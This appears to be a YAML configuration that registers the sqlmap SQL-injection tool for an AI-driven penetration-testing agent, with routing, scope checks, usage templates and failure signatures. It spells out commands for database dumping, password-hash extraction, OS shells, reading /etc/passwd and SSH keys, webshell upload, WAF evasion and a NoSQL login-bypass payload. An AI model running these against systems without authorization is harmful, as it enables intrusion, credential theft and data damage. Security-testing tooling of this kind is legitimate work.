name: sqlmap
kind: cli
binary: sqlmap
version: "1.x"
description: "Automatic SQL injection detection and exploitation tool. Supports six injection techniques (Boolean, Error, UNION, Stacked, Time-based, Inline). Detects MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB, DB2, and others. Beyond enumeration: OS command execution (--os-cmd / --os-shell), file read/write on the target host, raw SQL queries (--sql-query), password hash dumping (--passwords), 60+ WAF-bypass tamper scripts. Verbose prose output (no -oJ/-oX equivalent — tool_runner must parse text). Native CLI; LLM constructs the full sqlmap invocation. Use for confirmed or suspected SQL injection only — NOT for NoSQL/MongoDB injection (use curl with operator-injection payloads — `{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}` — and nuclei NoSQL templates) or directory enumeration (use ffuf)."
image: "ghcr.io/silicon-works/mcp-tools-sqlmap:latest"
image_size_mb: 150
# Dual-clock model — sqlmap can be quiet between batches and runs for hours
# on deep enumeration. Generous caps: correctness > latency.
idle_timeout_seconds: 600       # 10 min silence is "wedged" territory
max_runtime_seconds: 86400      # 24 h — covers --level=5 --risk=3 deep enum
timeout_seconds: 86400

capabilities:
  - sql_injection_detection
  - sql_injection_exploitation
  - database_enumeration
  - data_extraction
  - os_command_execution
  - file_read_write
  - waf_bypass

phases:
  - exploitation

routing:
  use_for:
    - "test a URL parameter for SQL injection"
    - "exploit confirmed SQL injection to enumerate databases / tables / columns"
    - "dump database contents through SQL injection"
    - "execute OS commands via SQL injection (--os-shell / --os-cmd)"
    - "read or write files on the target server via SQL injection"
    - "extract password hashes from a database via SQL injection"
    - "bypass a WAF blocking direct SQL injection payloads"
    - "execute a custom SQL query via injection (--sql-query)"
    - "test second-order SQL injection (--second-url)"
    - "test CSRF-protected forms or HTTP-authed endpoints for SQL injection"
  never_use_for:
    - "NoSQL injection — use curl with operator-injection payloads ($ne, $regex, $where) plus nuclei NoSQL templates"
    - "MongoDB or other document-store enumeration — use mongodb tool"
    - "directory or parameter brute-forcing — use ffuf"
    - "automated CVE / vulnerability scanning — use nuclei"
    - "stateful authenticated session flows beyond a single Cookie/auth-cred — use web-session"
  triggers:
    - "sqlmap"
    - "sql injection"
    - "sqli"
    - "database dump"
    - "union injection"
    - "blind injection"
    - "boolean injection"
    - "time-based injection"
    - "second-order injection"
    - "os-shell"
    - "os-cmd"
    - "tamper"

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 512
  cpu: 0.5

see_also:
  - tool: ffuf
    reason: "Use ffuf to discover URL parameters first; feed them to sqlmap"
  - tool: nuclei
    reason: "For automated SQLi-template scans across many endpoints"
  - tool: john
    reason: "Crack the hash dumps that --passwords / dump_table extract"
  - tool: hashcat
    reason: "GPU cracker for the same hashes"
  - tool: web-session
    reason: "Use to obtain an authenticated cookie before passing --cookie to sqlmap"

# ── kind:cli specific sections ──────────────────────────────────────

target_extraction:
  # sqlmap target is supplied via -u / --url / --url= flag (most common form),
  # or as a URL embedded in -r request files / -m URL lists / -g google dorks.
  # The latter forms are rejected up front (see reject_flags) — they put the
  # target outside the command line where scope validation can't reach it.
  # We extract the URL host from the simple -u / --url cases.
  - rule: "flag_value"
    flag: "-u"
    parse_as: "url_host"
  - rule: "flag_value"
    flag: "--url"
    parse_as: "url_host"
  # Some LLMs may emit --url= (with equals sign). Most flag parsers handle this
  # transparently; positional_match is the safety net.
  - rule: "positional_match"
    pattern: "^(?:--url=|-u=)?(https?|ftp|ftps|file|gopher)://([^:/?#*]+)"
    group: 2
    parse_as: "url_host"

# Flags whose presence makes target scope un-validatable. The plugin's
# cli_in_container rejects the call before docker spawn when any of these
# appear, with the reason below. The LLM can extract the target from the
# file/log first and pass it via -u for the actual scan.
reject_flags:
  - "-r"   # load HTTP request from file
  - "-l"   # parse Burp/WebScarab proxy log
  - "-m"   # bulk file of URLs
  - "-g"   # Google dork search
reject_flags_reason: "Multi-target/file-based ingestion forms put the target outside the command line. Extract the target into a regular -u/--url value first."

# Per-tool value-taking flags whose values must NOT be confused with positional
# targets. The DSL merges these with its built-in defaults. Only flags whose
# values could leak as URL hosts (or otherwise look like targets) need to be
# listed — flags taking obvious non-target values (--tamper, --threads, paths)
# don't need to be here, the URL regex naturally won't match them.
value_flags:
  - "--proxy"          # http://proxy:8080 — NOT the target
  - "--proxy-cred"     # creds, may contain @
  - "--safe-url"       # decoy URL between probes — NOT the target
  - "--safe-post"
  - "--safe-req"
  - "--csrf-url"       # CSRF token-fetching URL — NOT the target
  - "--csrf-token"
  - "--csrf-method"
  - "--csrf-data"
  - "--second-url"     # blind-injection result URL — different scope to track
  - "--second-req"
  - "--referer"        # arbitrary URL header value
  - "-e"
  - "--host"           # Host header override — NEVER the connection target
  - "--user-agent"
  - "--auth-cred"
  - "--auth-file"
  - "--cookie"
  - "--load-cookies"
  - "--data"
  - "--headers"
  - "--header"
  - "-H"
  - "--output-dir"
  - "-o"
  - "--prefix"
  - "--suffix"
  - "--string"
  - "--not-string"
  - "--regexp"
  - "--code"
  - "--tamper"
  - "--technique"
  - "--level"
  - "--risk"
  - "--threads"
  - "--time-sec"
  - "--union-cols"
  - "--union-char"
  - "--union-from"
  - "--dns-domain"
  - "--dbms"
  - "--os"
  - "--method"
  - "--skip"
  - "--param-filter"
  - "--param-exclude"
  - "--eval"
  - "--retries"
  - "--timeout"
  - "--delay"
  - "--encoding"
  - "--charset"
  - "-D"               # database name
  - "-T"               # table name
  - "-C"               # column name
  - "-X"               # exclude
  - "-U"               # user

usage_patterns:
  - name: "Detect SQLi on a GET parameter (default scan)"
    command: "sqlmap -u {url} --batch --random-agent --output-dir /session/sqlmap"
    when: "First-pass SQLi probe on a URL with a parameter (e.g., http://target/page.php?id=1). Use --batch to avoid the interactive prompts."

  - name: "Detect SQLi with explicit injection point marker"
    command: "sqlmap -u '{url_with_asterisk}' --batch --random-agent --output-dir /session/sqlmap"
    when: "Target has an unusual injection point that sqlmap won't auto-detect — mark it with * (e.g., http://target/api/users/1*/profile)."

  - name: "Detect SQLi in a POST body parameter"
    command: "sqlmap -u {url} --data='{post_body}' --batch --random-agent --output-dir /session/sqlmap"
    when: "Form/API endpoint that accepts POST data. Use * inside --data to mark the injection point (e.g., 'username=admin&password=*')."

  - name: "Detect SQLi behind a session cookie"
    command: "sqlmap -u {url} --cookie='{cookie_string}' --batch --random-agent --output-dir /session/sqlmap"
    when: "Endpoint requires an authenticated session — paste the Cookie header value."

  - name: "Detect SQLi from a captured Burp request"
    command: "sqlmap -r {request_file} --batch --random-agent --output-dir /session/sqlmap"
    when: "Use a saved HTTP request file (Burp 'Save item') instead of reconstructing flags. Best when the request has many headers, multipart bodies, or CSRF tokens."

  - name: "Enumerate databases (after SQLi confirmed)"
    command: "sqlmap -u {url} --batch --random-agent --dbs --output-dir /session/sqlmap"
    when: "Run after a successful detection to list all DB schemas. sqlmap reuses the cached injection point from the session."

  - name: "Enumerate tables in a specific database"
    command: "sqlmap -u {url} --batch -D {database} --tables --output-dir /session/sqlmap"
    when: "After --dbs returns schema names. Quote {database} if it contains spaces."

  - name: "Enumerate columns in a specific table"
    command: "sqlmap -u {url} --batch -D {database} -T {table} --columns --output-dir /session/sqlmap"
    when: "After --tables identifies a target table. Use before --dump if you only want certain columns."

  - name: "Dump a specific table"
    command: "sqlmap -u {url} --batch -D {database} -T {table} --dump --output-dir /session/sqlmap"
    when: "Extract data from one table. Add -C 'col1,col2' to limit columns; --where 'role=\"admin\"' for filtered rows; --start N --stop M for row windows."

  - name: "Dump only credential columns (faster on blind)"
    command: "sqlmap -u {url} --batch -D {database} -T {table} -C 'username,password,email' --dump --output-dir /session/sqlmap"
    when: "Targeted credential extraction. Crucial speed win on time-based blind injection — every cell is a separate request."

  - name: "Dump database user password hashes"
    command: "sqlmap -u {url} --batch --passwords --output-dir /session/sqlmap"
    when: "Extracts DBMS user accounts (mysql.user / pg_shadow / sys.sql_logins) for offline cracking. Often DBA-only privilege required."

  - name: "Run a custom SQL query"
    command: "sqlmap -u {url} --batch --sql-query='{query}' --output-dir /session/sqlmap"
    when: "When --dbs/--tables/--dump don't fit the question (e.g., SELECT @@version, SELECT user(), JOINs). Single-statement only — use --sql-shell for an interactive REPL."

  - name: "Get an OS shell on the DB server"
    command: "sqlmap -u {url} --batch --os-shell --output-dir /session/sqlmap"
    when: "Confirmed SQLi + sufficient DB privileges (FILE on MySQL / xp_cmdshell on MSSQL / superuser on PostgreSQL). Returns an interactive shell via stacked queries or DBMS-specific exec primitives."

  - name: "Execute a single OS command"
    command: "sqlmap -u {url} --batch --os-cmd='{command}' --output-dir /session/sqlmap"
    when: "One-shot RCE via SQLi. Use for 'id', 'whoami', or to drop a one-line reverse shell. Same DBMS prerequisites as --os-shell."

  - name: "Read a file from the target server"
    command: "sqlmap -u {url} --batch --file-read='{remote_path}' --output-dir /session/sqlmap"
    when: "Pull /etc/passwd, web app config, SSH keys, source code. Requires LOAD_FILE / pg_read_file / OPENROWSET privileges."

  - name: "Write a file to the target server (webshell upload)"
    command: "sqlmap -u {url} --batch --file-write={local_file} --file-dest={remote_path} --output-dir /session/sqlmap"
    when: "Drop a webshell via SELECT INTO OUTFILE / xp_cmdshell / COPY TO. Requires write privilege and a writable path inside the webroot."

  - name: "WAF bypass with tamper scripts"
    command: "sqlmap -u {url} --batch --random-agent --tamper={tamper_list} --output-dir /session/sqlmap"
    when: "Detection failed and you suspect WAF interference. Common combos: 'space2comment,between' (lightweight), 'charencode,randomcase,space2comment' (medium), 'space2morehash,charunicodeencode' (heavy). List all tampers with `sqlmap --list-tampers`."

  - name: "Aggressive deep scan (level 5 / risk 3)"
    command: "sqlmap -u {url} --batch --random-agent --level=5 --risk=3 --output-dir /session/sqlmap"
    when: "Last resort when default scan finds nothing. Risk 3 includes OR-based payloads that can MODIFY DATA — never on production. Level 5 tests cookies, headers, User-Agent, Referer (slow)."

  - name: "Force time-based blind only (when other techniques fail)"
    command: "sqlmap -u {url} --batch --random-agent --technique=T --time-sec=10 --output-dir /session/sqlmap"
    when: "Boolean / error / UNION all fail and you suspect blind injection on a slow target. Increase --time-sec on high-latency or noisy networks."

  - name: "Inject behind a CSRF-protected form"
    command: "sqlmap -u {url} --data='{post_body}' --csrf-token={csrf_param} --csrf-url={csrf_fetch_url} --batch --output-dir /session/sqlmap"
    when: "Form requires a freshly-issued CSRF token per request. sqlmap fetches a new token before each injection attempt."

  - name: "Inject through a Burp / SOCKS proxy"
    command: "sqlmap -u {url} --batch --proxy='{proxy_url}' --output-dir /session/sqlmap"
    when: "Pivot through Burp Suite (http://127.0.0.1:8080) for inspection, or through a SOCKS tunnel to reach internal-only targets."

output_formats:
  # sqlmap has NO native JSON / XML output flag for findings — output is verbose
  # prose. The closest to structured output is the per-target session directory
  # under --output-dir, which contains session.sqlite, log files, and dump CSVs.
  # tool_runner MUST parse the prose; the session dir provides raw_ref backup.
  - flag: "--output-dir {path}"
    format: "session_dir"
    preferred: true
  - flag: "--dump-format=CSV"
    format: "csv_dump"
    preferred: false
  - flag: "-v 6"
    format: "verbose_prose"
    preferred: false
  - flag: "--flush-session"
    format: "fresh_session"
    preferred: false

common_options:
  target_input:
    - "-u URL: single target URL (most common)"
    - "--url=URL: same as -u"
    - "-r FILE: load HTTP request from file (Burp save format)"
    - "-l FILE: load Burp / WebScarab proxy log"
    - "-m FILE: file with multiple target URLs"
    - "-g DORK: process Google dork results"
    - "-c FILE: load options from a sqlmap config file"
  request:
    - "--data=BODY: POST body (auto-switches method to POST)"
    - "--cookie=STRING: Cookie header"
    - "-H 'Header: value': extra HTTP header (repeatable)"
    - "--method=METHOD: force HTTP method (GET/POST/PUT/PATCH/DELETE)"
    - "--user-agent=STRING: custom User-Agent"
    - "--random-agent: rotate UA from a pool (WAF evasion)"
    - "--referer=STRING: Referer header"
    - "--auth-type=Basic|Digest|NTLM|PKI"
    - "--auth-cred=USER:PASS"
  injection_point:
    - "Mark in URL/body/cookie with *: e.g., -u 'http://t/?id=1*' or --data='user=*&pass=x'"
    - "-p PARAM: test only this param (skip others)"
    - "--skip=PARAMS: don't test these"
    - "--prefix=STR --suffix=STR: wrap payloads with known SQL context"
  detection:
    - "--level=1..5: depth of testing (1 default; 2 adds Cookie; 3 adds UA/Referer; 4-5 adds payloads)"
    - "--risk=1..3: aggressiveness (1 safe; 2 adds heavy time-based; 3 adds OR-based — CAN MODIFY DATA)"
    - "--technique=BEUSTQ: enable specific techniques only"
    - "--dbms=NAME: skip DBMS detection by forcing it"
    - "--code=N --string=S --not-string=S: response signature for boolean detection"
    - "--time-sec=N: delay for time-based blind (raise on slow nets)"
  enumeration:
    - "--dbs: list databases"
    - "-D NAME --tables: list tables in DB"
    - "-D NAME -T TABLE --columns: list columns"
    - "-D NAME -T TABLE --dump: dump table contents"
    - "-D NAME -T TABLE -C col1,col2 --dump: dump only chosen columns"
    - "--dump-all: dump all DBs (long; usually too much)"
    - "--start=N --stop=M: row window"
    - "--where='col=val': filtered dump"
    - "--passwords: dump DBMS account hashes"
    - "--privileges --roles --users: enumerate DBMS-side accounts"
  exploitation:
    - "--sql-query='SELECT ...': run raw SQL via injection"
    - "--sql-shell: interactive SQL REPL via injection"
    - "--os-cmd='id': single OS command"
    - "--os-shell: interactive OS shell"
    - "--file-read=/etc/passwd: read file from server"
    - "--file-write=local --file-dest=/var/www/html/s.php: write file to server"
  waf_bypass:
    - "--tamper=script1,script2: chain tamper scripts (run --list-tampers in container)"
    - "--random-agent: rotate UA"
    - "--delay=N --safe-url=URL --safe-freq=N: throttling + decoy traffic"
    - "--proxy=http://burp:8080: route through interception proxy"
  performance:
    - "--threads=N: 1-10 concurrent requests"
    - "--retries=N: per-request retries"
    - "--timeout=N: per-request timeout"
    - "--null-connection: HEAD/Range trick for boolean — much faster but doesn't work everywhere"
    - "--keep-alive: HTTP keep-alive (default on)"
  noise_control:
    - "--batch: NEVER skip — answers all interactive prompts with defaults"
    - "-v 0..6: verbosity (0=quiet, 1=default, 6=full HTTP)"
    - "--purge: wipe sqlmap session data (history, logs)"
    - "--flush-session: discard cached injection points and re-detect"
  output:
    - "--output-dir=/session/sqlmap: where session.sqlite + dump CSVs land"
    - "--dump-format=CSV|HTML|SQLITE"

gotchas:
  - "ALWAYS pass --batch — sqlmap is interactive by default and will hang waiting for stdin in a container"
  - "ALWAYS pass --random-agent (or set --user-agent) — sqlmap's default UA contains 'sqlmap' and is blocked by every modern WAF"
  - "Pin --output-dir to /session/sqlmap so dumps and session.sqlite persist across tool calls and become the raw_ref"
  - "* in the URL or --data marks a manual injection point. If you're sure where the bug is from prior recon, use it — sqlmap then SKIPS auto-detection on other params and is much faster"
  - "Re-running on the same URL reuses cached results from session.sqlite — pass --flush-session if you intentionally want a fresh detection (e.g., target changed)"
  - "Use --ignore-code=401,403,500 when the endpoint returns non-200 — without it sqlmap may refuse to test"
  - "For POST: the URL goes to -u, the body to --data; the LLM should NOT cram the body into the URL"
  - "URL-encode special chars in --data manually if needed; sqlmap's auto-encoding sometimes mangles complex bodies. Use -r request_file for messy payloads"
  - "--risk=3 includes OR-based payloads that can DELETE rows — never use without explicit user authorization on the target"
  - "Time-based blind on a noisy network needs --time-sec >=10 to avoid false positives from latency jitter"
  - "Tamper scripts can interact badly with each other — start with one (e.g., space2comment), add more only if still blocked"
  - "--threads=1 is the default for time-based blind (parallel time tests are unreliable). For UNION/error-based, raise to 4-8 on stable targets"
  - "When sqlmap reports 'might not be injectable' or 'does not seem injectable', it is NOT a confirmed finding — false-positive guard rejects these in any vulnerability flag"
  - "--proxy=http://127.0.0.1:8080 routes through Burp/ZAP for live inspection of every payload"
  - "On a fully-patched target, default scan finishes in 1-3 minutes saying 'all tested parameters do not appear to be injectable'. That is a real result, not a tool failure — increase --level/--risk or move on"
  - "ALWAYS pass --disable-coloring in container runs — ANSI escape codes pollute stdout and break failure_signature substring matching (verified during pilot)"
  - "When passing multiple HTTP headers, the LLM may either repeat -H 'Header: value' or send a semicolon-separated string for a single --headers flag. The former is more reliable; semicolon-splitting depends on tool_runner's pre-processing"
  - "--data automatically switches sqlmap to POST. Do NOT also pass --method=POST or -X — they conflict. Use --method only for PUT/PATCH/DELETE bodies"
  - "When dumping tables, append --dump-format=CSV explicitly — sqlmap's default dump format varies across versions and CSV is the only one tool_runner can reliably parse from session_dir"
  - "--file-read returns content via two possible paths: (a) 'file saved to' line points at a local copy in --output-dir, (b) inline '[INFO] retrieved:' lines hold the bytes when no local copy was written. Check both before declaring the read failed"
  - "--file-write completing without error does NOT mean the file landed on disk — the DB user may lack FILE/INTO OUTFILE privilege. Look for 'file has been successfully written' in stdout to confirm; absence means privilege failure, not tool failure"

failure_signatures:
  # IMPORTANT: sqlmap EXITS 0 even on hard failures (DNS, refused, timeout).
  # tool_runner MUST NOT trust the exit code alone — every signal here is the
  # actual stderr/stdout substring from sqlmap 1.7.2 (verified 2026-04-25 in
  # the kind:cli image). Strings have been live-verified against the container.
  - signal: "all tested parameters do not appear to be injectable"
    remediation: "raise --level (3-5) and --risk (2-3); add --tamper=space2comment,between; add --random-agent; verify the parameter is reachable manually; if injection is second-order, use --second-url; consider that the target really isn't vulnerable"
  - signal: "host '"
    remediation: "DNS resolution failed — sqlmap reports 'host \\'<name>\\' does not exist, skipping to the next target'. Fix the hostname, check /etc/hosts inside the container, or use IP"
  - signal: "does not exist, skipping to the next target"
    remediation: "DNS or target enumeration error — same as host '...' does not exist"
  - signal: "unable to connect to the target URL"
    remediation: "TCP connect failed (refused/closed/filtered) — sqlmap echoes the underlying socket error in parens, e.g. ('Connection refused'). Confirm the port with nmap -p N <host> and check --proxy"
  - signal: "Connection refused"
    remediation: "the port is closed or filtered — confirm the web service is up with nmap -p 80,443 <host>"
  - signal: "connection timed out to the target URL"
    remediation: "TCP connect or response timeout — raise --timeout (default 30s) and --retries; reduce --threads; check VPN / network path"
  - signal: "Timeout was reached"
    remediation: "same — target slow; raise --timeout and reduce --threads"
  - signal: "invalid target URL"
    remediation: "the URL must include http:// or https:// scheme; quote the URL if it contains shell metacharacters (& ? # *)"
  - signal: "WAF/IPS"
    remediation: "WAF detected — try --tamper=space2comment,between,charencode and --random-agent; route through Burp (--proxy) to see what's getting blocked"
  - signal: "protected by some kind of WAF"
    remediation: "same as WAF/IPS"
  - signal: "no parameter(s) found for testing"
    remediation: "the URL has no GET params and no --data was supplied; add a parameter (?id=1) or pass --data='param=value'"
  - signal: "unable to retrieve the page content"
    remediation: "the target returned an empty/error response — verify with curl, check --ignore-code=N for a 401/500 endpoint, or pass --headers if a custom Accept is needed"
  - signal: "permission denied"
    remediation: "DB user lacks the privilege for this operation (FILE for --file-read/--file-write, DBA for --passwords). Try a different injection point or escalate first"
  - signal: "unable to evaluate the provided expression"
    remediation: "the SQL query / payload contains a syntax error — quote special chars and check sqlmap is using the right --dbms"
  - signal: "your sqlmap version is outdated"
    remediation: "informational only — sqlmap warns on every run. Not a failure; ignore unless updating image is in scope"

help_commands:
  - command: "sqlmap --help"
    purpose: "Common flags (concise)"
  - command: "sqlmap -hh"
    purpose: "Full flag reference (long help)"
  - command: "sqlmap --version"
    purpose: "Version + Python info"
  - command: "sqlmap --list-tampers"
    purpose: "List all available WAF-bypass tamper scripts"
  - command: "sqlmap --dependencies"
    purpose: "Check optional Python dependencies (e.g., for NTLM auth)"
